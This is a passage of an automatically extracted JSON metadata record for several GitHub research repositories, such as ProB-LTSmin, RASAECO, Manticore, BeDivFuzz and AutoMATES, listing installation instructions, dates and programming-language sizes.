                    "value": "Firstly for Ubuntu we need to install the following dependencies:\n\n```\n$ sudo apt-get install build-essential automake autoconf libtool\nlibzmq3 libzmq3-dev libczmq libczmq-dev libboost-all-dev libpopt-dev\nzlib1g-dev zlib1g flex ant asciidoc xmlto doxygen wget git\n```\n\nOnce these are installed we can now begin to build the required components for the integration.\n\n1. Clone the repository:\n    * `$ git clone git@github.com:utwente-fmt/ProB-LTSmin-iFM16.git`\n2. Change directory:\n    * `$ cd ProB-LTSmin-iFM16`\n3. Get the latest ProB LTSmin development tool:\n    * `$ wget http://nightly.cobra.cs.uni-duesseldorf.de/ltsmin/ProB.linux64.tar.gz`\n4. Unpack ProB:\n    * `$ tar xvf ProB.linux64.tar.gz`\n5. Clone the LTSmin ProB Branch:\n    * `git submodule update --init`\n6. Change directory to ltsmin:\n    * `cd ltsmin`\n7. Get the latest modules for ltsmin:\n    * `git submodule update --init`\n8. Run `ltsminreconf`:\n    * `./ltsminreconf`\n9. Configure the LTSmin build:\n    * `./configure --without-spins --without-scoop --prefix ~/bin/ltsmin`\n    * Change the prefix location. At current it will install to your `$HOME` directory under `bin/ltsmin`.\n10. Make and install:\n    * `make all install`\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Linux",
                    "parent_header": [
                        "Symbolic Reachability Analysis of B through ProB and LTSmin",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/utwente-fmt/ProB-LTSmin-iFM16/master/README.md"
            },
            {
                "result": {
                    "value": "Before beginning the installation process on Mac we recommend having [Xcode], [Developer Command Line tools](https://apple.stackexchange.com/questions/88535/how-to-download-the-command-line-tools-for-xcode-without-the-downloads-for-devel) and [Homebrew] installed.\n\nBefore we can build the LTSmin ProB link we need to install required dependencies:\n\n```\n$ brew tap homebrew/science\n$ brew install asciidoc xmlto boost popt lzlib flex ant doxygen automake\nautoconf libtool zeromq czmq hwloc wget git\n```\n\nOnce all the dependencies have been installed above we can now continue to build LTSmin ProB link tools:\n\n1. Clone the repository:\n    * `$ git clone git@github.com:utwente-fmt/ProB-LTSmin-iFM16.git`\n2. Change directory:\n    * `$ cd ProB-LTSmin-iFM16`\n3. Get the latest ProB LTSmin development tool:\n    * `$ wget http://nightly.cobra.cs.uni-duesseldorf.de/ltsmin/ProB.mac_os.10.7.5.x86_64.tar.gz`\n4. Unpack ProB:\n    * `$ tar xvf ProB.mac_os.10.7.5.x86_64.tar.gz`\n5. Clone the LTSmin ProB Branch:\n    * `git submodule update --init`\n6. Change directory to ltsmin:\n    * `cd ltsmin`\n7. Get the latest modules for ltsmin:\n    * `git submodule update --init`\n8. Run `ltsminreconf`:\n    * `./ltsminreconf`\n9. Configure the LTSmin build:\n    * `./configure --without-spins --without-scoop --prefix ~/bin/ltsmin`\n    * Change the prefix location. At current it will install to your `$HOME` directory under `bin/ltsmin`.\n10. Make and install:\n    * `make all install`\n\nIf you experience issues with xmldoc giving I/O errors you will need to either\nadd the following export to your bashrc, or execute in terminal:\n\n```\nexport XML_CATALOG_FILES=\"/usr/local/etc/xml/catalog\"\n```\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Mac OS",
                    "parent_header": [
                        "Symbolic Reachability Analysis of B through ProB and LTSmin",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/utwente-fmt/ProB-LTSmin-iFM16/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Please note the implementation **ONLY** works on [Linux] and [Mac OS]. \n",
                    "original_header": "Symbolic Reachability Analysis of B through ProB and LTSmin"
                },
                "confidence": 0.9598541228273476,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/utwente-fmt/ProB-LTSmin-iFM16/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* [Abstract]\n* [Prerequisites]\n* [Installation]\n    - [Linux]\n    - [Mac OS]\n* [Usage]\n    - [ProB CLI]\n    - [ProB to LTSmin link]\n    - [LTSmin Symbolic]\n* [Experiments]\n \n",
                    "original_header": "Table of Contents"
                },
                "confidence": 0.9995948218376752,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/utwente-fmt/ProB-LTSmin-iFM16/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2016-01-13T13:52:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-01-22T13:00:20Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "674": {
        "filename": "Echtzeitsysteme_CorrectByConstructionTCFamilies-SoSyM17_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Echtzeitsysteme/CorrectByConstructionTCFamilies-SoSyM17",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2016-11-01T11:41:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2016-11-01T11:44:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "675": {
        "filename": "gmy2013_LLM_Comment_Generation_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/gmy2013/LLM_Comment_Generation",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-06-08T14:49:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-27T12:27:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 30056
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "676": {
        "filename": "mristin_rasaeco_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/mristin/rasaeco",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Single-File Release\n~~~~~~~~~~~~~~~~~~~\nPlease download and unzip the latest release from\n`the GitHub release page <https://github.com/mristin/rasaeco/releases>`_.\n\nFrom PyPI\n~~~~~~~~~\nThe tool is also available on `PyPI <https://pypi.org>`_.\n\nCreate a virtual environment:\n\n.. code-block::\n\n    python -m venv venv-rasaeco\n\nActivate it (in Windows):\n\n.. code-block::\n\n    venv-rasaeco\\Scripts\\activate\n\nor in Linux and OS X:\n\n.. code-block::\n\n    source venv-rasaeco/bin/activate\n\nInstall the tool in the virtual environment:\n\n.. code-block::\n\n    pip3 install rasaeco\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "RASAECO"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/mristin/rasaeco/main/README.rst"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": ".. image:: https://github.com/mristin/rasaeco/actions/workflows/check.yml/badge.svg\n    :target: https://github.com/mristin/rasaeco/actions/workflows/check.yml\n    :alt: Check \n.. image:: https://coveralls.io/repos/github/mristin/rasaeco/badge.svg?branch=main\n    :target: https://coveralls.io/github/mristin/rasaeco?branch=main\n    :alt: Test coverage \n.. image:: https://badge.fury.io/py/rasaeco.svg\n    :target: https://badge.fury.io/py/rasaeco\n    :alt: PyPI - version \n.. image:: https://img.shields.io/pypi/pyversions/rasaeco.svg\n    :alt: PyPI - Python Version \n\nRASAECO (\"Requirements Analysis for Software in AECO Industry\") is a tool\nwe developed within the `BIMprove Project <https://www.bimprove-h2020.eu/>`_ to\nhelp us analyze the software requirements after the finished elicitation phase.\n \n",
                    "original_header": "RASAECO"
                },
                "confidence": 0.9941814227392989,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/mristin/rasaeco/main/README.rst"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "**Test cases**. Test cases are marked using ``<test name=\"...\">...</test>``. You can reference the\nindividual tests using ``<testref name=\"...\" />``. \n**Acceptance criteria**. Acceptance criteria are marked using ``<acceptance name=\"...\">...</test>``.\nYou can reference the individual acceptance criteria using ``<acceptanceref name=\"...\" />``. \nFurther Examples\n~~~~~~~~~~~~~~~~\nPlease see\n`Sample scenarios <https://github.com/mristin/rasaeco/tree/main/sample_scenarios>`_\nfor further examples.\n \n",
                    "original_header": "Cheat-sheet"
                },
                "confidence": 0.9609633225651758,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/mristin/rasaeco/main/README.rst"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-12-11T10:36:49Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-07-12T19:17:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 88007
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "677": {
        "filename": "kzh23_Replication-Package-ICSE-NIER-2023-Unsupervised-ML_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/kzh23/Replication-Package-ICSE-NIER-2023-Unsupervised-ML",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-01-27T07:25:37Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-30T12:53:51Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 159496
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 53841
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "678": {
        "filename": "trailofbits_manticore_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/trailofbits/manticore",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "> Note: We recommend installing Manticore in a [virtual environment](https://packaging.python.org/guides/installing-using-pip-and-virtual-environments/#installing-virtualenv)\n to prevent conflicts with other projects or packages\n\nOption 1: Installing from PyPI:\n\n```bash\npip install manticore\n```\n\nOption 2: Installing from PyPI, with extra dependencies needed to execute native binaries:\n\n```bash\npip install \"manticore[native]\"\n```\n\nOption 3: Installing a nightly development build:\n\n```bash\npip install --pre \"manticore[native]\"\n```\n\nOption 4: Installing from the `master` branch:\n\n```bash\ngit clone https://github.com/trailofbits/manticore.git\ncd manticore\npip install -e \".[native]\"\n```\n\nOption 5: Install via Docker:\n\n```bash\ndocker pull trailofbits/manticore\n```\n\nOnce installed, the `manticore` CLI tool and Python API will be available.\n\nFor a development installation, see our [wiki](https://github.com/trailofbits/manticore/wiki/Hacking-on-Manticore).\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "Manticore"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/trailofbits/manticore/master/README.md"
            },
            {
                "result": {
                    "value": "For more details go to https://cvc4.github.io/. Otherwise, just get the binary and use it.\n\n        sudo wget -O /usr/bin/cvc4 https://github.com/CVC4/CVC4/releases/download/1.7/cvc4-1.7-x86_64-linux-opt\n        sudo chmod +x /usr/bin/cvc4\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing CVC4",
                    "parent_header": [
                        "Manticore",
                        "Using a different solver (Yices, Z3, CVC4)"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/trailofbits/manticore/master/README.md"
            },
            {
                "result": {
                    "value": "Yices is incredibly fast. More details here https://yices.csl.sri.com/\n\n        sudo add-apt-repository ppa:sri-csl/formal-methods\n        sudo apt-get update\n        sudo apt-get install yices2\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing Yices",
                    "parent_header": [
                        "Manticore",
                        "Using a different solver (Yices, Z3, CVC4)"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/trailofbits/manticore/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<p align=\"center\">\n  <img src=\"https://raw.githubusercontent.com/trailofbits/manticore/master/docs/images/manticore.png\" width=\"256\" title=\"Manticore\">\n</p>\n<br /> \n",
                    "original_header": "Manticore"
                },
                "confidence": 0.955991324298176,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/trailofbits/manticore/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Ethereum smart contracts (EVM bytecode)\n- Linux ELF binaries (x86, x86_64, aarch64, and ARMv7)\n- WASM Modules\n \n",
                    "original_header": "Features"
                },
                "confidence": 0.9968602220174192,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/trailofbits/manticore/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Manticore relies on an external solver supporting smtlib2. Currently Z3, Yices and CVC4 are supported and can be selected via command-line or configuration settings.\nIf Yices is available, Manticore will use it by default. If not, it will fall back to Z3 or CVC4. If you want to manually choose which solver to use, you can do so like this:\n```manticore --smt.solver Z3``` \n",
                    "original_header": "Using a different solver (Yices, Z3, CVC4)"
                },
                "confidence": 0.9975883664111116,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/trailofbits/manticore/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2017-02-10T22:28:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-30T22:03:28Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 10813771
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Solidity",
                    "name": "Solidity",
                    "type": "Programming_language",
                    "size": 35214
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 11124
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jinja",
                    "name": "Jinja",
                    "type": "Programming_language",
                    "size": 10729
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 7463
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "WebAssembly",
                    "name": "WebAssembly",
                    "type": "Programming_language",
                    "size": 1599
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 828
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 700
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Just",
                    "name": "Just",
                    "type": "Programming_language",
                    "size": 598
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "679": {
        "filename": "hub-se_BeDivFuzz_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/hub-se/BeDivFuzz",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Then, run the container (with the current directory mounted to `/workspace` inside the container):\n```\ndocker run -it --rm -v ${PWD}:/workspace bedivfuzz\n```\n \n",
                    "original_header": "Using Docker"
                },
                "confidence": 0.983763037202674,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/hub-se/BeDivFuzz/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To build BeDivFuzz and Zest, run:\n```\nmvn package\n``` \nRLCheck needs to be build separately:\n```\ncd RLCheck/jqf/\nmvn package\ncd ../..\n```\n \n",
                    "original_header": "Step 1: Build BeDivFuzz, Zest, and RLCheck"
                },
                "confidence": 0.9937843998251537,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/hub-se/BeDivFuzz/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "We can now perform a test run of BeDivFuzz (e.g., on Rhino) as follows:\n```\nbin/jqf-bediv -c $(scripts/examples_classpath.sh) edu.berkeley.cs.jqf.examples.rhino.CompilerTest testWithSplitGenerator\n``` \n",
                    "original_header": "Optional: Test BeDivFuzz"
                },
                "confidence": 0.999083458944303,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/hub-se/BeDivFuzz/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The evaluation script can be executed as follows:\n ```\nscripts/run_parallel_experiments.sh -o out_dir -t timeout -n repetitions -p parallel_workers [-r]\n ``` \n",
                    "original_header": "Step 2: Perform the Evaluation"
                },
                "confidence": 0.9578116863530483,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/hub-se/BeDivFuzz/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To generate the crash table (Table 1) from `crash-results`, the following command can be used:\n```\npython3 scripts/gen_crash_table.py crash-results\n```\nThe table will be printed on the terminal, but also saved as `crash-results/crash_table.txt`.\n \n",
                    "original_header": "Step 3: Generate the figures"
                },
                "confidence": 0.9890330399774419,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/hub-se/BeDivFuzz/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-03-01T08:54:35Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-03T07:11:37Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 788154
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 489570
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 66285
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 32089
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 9067
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 462
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 133
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "680": {
        "filename": "game-dev-database_postmortem-problems_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/game-dev-database/postmortem-problems",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2019-12-18T15:56:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-17T16:05:50Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "681": {
        "filename": "logpai_hybridlog_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/logpai/hybridlogparser",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-08-14T06:38:43Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-24T17:32:42Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 22437
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "682": {
        "filename": "joymallyac_Fairway_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/joymallyac/Fairway",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-05-23T04:23:59Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-05-29T09:07:59Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 196706
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 74817
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 90
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "683": {
        "filename": "MShudrak_ida-metrics_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/mxmssh/IDAmetrics",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Minimal requirements: \n",
                    "original_header": "IDAMetrics-static.py"
                },
                "confidence": 0.9760286703763255,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/MShudrak/ida-metrics/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "We tested metrics to predict bugs in the following list of vulnerable apps: http://goo.gl/4dKypy \n",
                    "original_header": "Metrics efficiency analysis"
                },
                "confidence": 0.9487037662686649,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/MShudrak/ida-metrics/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2015-01-28T05:38:27Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-30T00:27:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 83765
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 4250
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "684": {
        "filename": "facebookresearch_coder_reviewer_reranking_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/facebookresearch/coder_reviewer_reranking",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "1. All experiments are run with `python==3.8.13`. \n2. Install [pyminifier](https://github.com/liftoff/pyminifier/tree/master) from source.\nInstalling `pyminifier` requires reverting setup tools to an older version (`pip install setuptools==57.5.0`). \nFor other issues of installing `pyminifier`, checkout their [issues](https://github.com/liftoff/pyminifier/issues) for potential fixes.\n3. Install `torch==1.12.1`. You should install a distribution that matches your hardware environment \n4. Install the other packages by \n```bash\npip install -r requirements.txt\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing software environment",
                    "parent_header": [
                        "Coder Reviewer Reranking for Code Generation",
                        "Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/facebookresearch/coder_reviewer_reranking/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-11-29T02:28:37Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-03T10:43:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 183552
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "685": {
        "filename": "ml4ai_automates_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ml4ai/automates",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<p align=\"center\">\n  \n  \n  <a href=\"https://github.com/ml4ai/automates/actions\">\n    <img src=\"https://img.shields.io/github/workflow/status/ml4ai/automates/Continuous%20Integration?label=tests\" alt=\"GH Actions build status\">\n  </a>\n  <a href=\"https://codecov.io/gh/ml4ai/automates\">\n   <img src=\"https://codecov.io/gh/ml4ai/automates/branch/master/graph/badge.svg\" />\n  </a>\n  <a href=\"https://www.codefactor.io/repository/github/ml4ai/automates\"><img src=\"https://www.codefactor.io/repository/github/ml4ai/automates/badge\" alt=\"CodeFactor\" /></a>\n</p> \n",
                    "original_header": "Automated Model Assembly<br>from Text, Equations, and Software"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ml4ai/automates/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "For documentation: https://ml4ai.github.io/automates \n## Installation instructions\nFor all operating systems, the first step of the installation process is to clone the AutoMATES repository. \n### Linux and macOS\n- Create a new [Python virtualenv](https://docs.python.org/3/library/venv.html)\n- Activate your new Python virtualenv\n- Install Graphviz as defined below\n- Run `pip install -e .` from the root of the AutoMATES directory \n#### GraphViz installation\n##### Debian flavored linux\n- Use the command: `sudo apt-get install graphviz libgraphviz-dev pkg-config`\n##### macOS with Homebrew\n- Use the command: `brew install graphviz`\n- Install PyGraphviz to your virtualenv with: `pip install --install-option=\"--include-path=/usr/local/include/\" --install-option=\"--library-path=/usr/local/lib\" pygraphviz` \n### Windows\n- Download and install [Anaconda](https://www.anaconda.com/products/individual)\n- Edit the `PYTHONPATH` variable in `environment.yml` to be your local path to your checkout of the AutoMATES repo\n- Run `conda env create --file environment.yml` from the root of the AutoMATES directory\n \n"
                },
                "confidence": 0.999518904332646,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ml4ai/automates/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-11-14T02:42:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-29T16:52:35Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Fortran",
                    "name": "Fortran",
                    "type": "Programming_language",
                    "size": 19229297
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 4394848
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 3864315
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Scala",
                    "name": "Scala",
                    "type": "Programming_language",
                    "size": 645727
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 456182
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Gnuplot",
                    "name": "Gnuplot",
                    "type": "Programming_language",
                    "size": 195622
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 92038
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
